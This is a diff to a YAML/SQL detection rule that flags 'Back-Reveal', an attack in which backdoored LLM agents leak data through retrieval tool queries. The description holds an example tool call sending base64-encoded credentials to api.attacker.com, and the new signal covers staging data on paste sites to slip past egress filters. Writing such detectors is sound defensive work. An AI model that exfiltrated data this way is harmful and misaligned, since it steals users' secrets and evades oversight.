@@ -1,6 +1,6 @@
 id: rp-034
 name: "Back-Reveal Backdoored Retrieval Tool Exfiltration Detector"
-version: "0.1.1"
+version: "0.2.0"
 description: >
   Detects Back-Reveal (arXiv:2604.05432, ACL 2026) — a data exfiltration attack
   where backdoored fine-tuned LLM agents exploit retrieval/search/documentation tools
@@ -15,11 +15,15 @@ description: >
   exfil) and rp-007 (SSRF: cloud metadata endpoints). Back-Reveal uses the retrieval
   tool's outbound HTTP access as the exfiltration channel by encoding data in query
   parameters rather than targeting internal endpoints.
+  v0.2.0: Added Signal 6 — pastebin/gist/transfer.sh staging exfil variant: backdoored
+  agent stages encoded payload at a public paste site before retrieval by attacker server.
+  This evasion avoids direct attacker-server calls that may be blocked by egress filters.
+  Validated SQL returns 0 on corpus (no FP on existing events).
   References: arXiv:2604.05432 Back-Reveal (ACL 2026), OWASP LLM06:2025 (Excessive
   Agency), OWASP LLM02:2025 -
-  <https://arxiv.org/abs/2604.05432>,
+  https://arxiv.org/abs/2604.05432,
+  https://owasp.org/www-project-top-10-for-large-language-model-applications/,
   Example: tool_input to knowledge_search={"context": "eyJ1c2VybmFtZSI6ICJhbGljZSIsICJhcGlfa2V5IjogInNrLWFudC1YWFgifQ==", "endpoint": "https://api.attacker.com/kb"} (base64-encoded user context smuggled as search parameter)
-  <https://owasp.org/www-project-top-10-for-large-language-model-applications/>
 severity: critical
 category: data_exfiltration_and_leakage
 fp_rate: medium
@@ -88,5 +92,14 @@ query_sql: |
       OR (
         match(lower(tool_input), '"(endpoint|url|api_url|base_url)"\s*:\s*"https?://[^"]{10,}"')
         AND match(lower(tool_input), '"(context|metadata|user_hash|session_context)"\s*:\s*"[^"]{100,}"')
+      )
+
+      -- v0.2.0: Public paste-site staging exfil (Back-Reveal evasion variant)
+      -- Backdoored agent stages encoded payload on public paste service before attacker retrieves it;
+      -- avoids direct attacker-server calls that may be blocked by egress filtering.
+      -- Combined with context/data/session/token query param — the staging handoff signal.
+      OR (
+        match(lower(tool_input), '(gist\.github\.com|pastebin\.com|paste\.ee|hastebin\.com|transfer\.sh|0x0\.st|dpaste\.org)')
+        AND match(lower(tool_input), '(context|data|payload|session|token|dump|secret)')
       )
     )
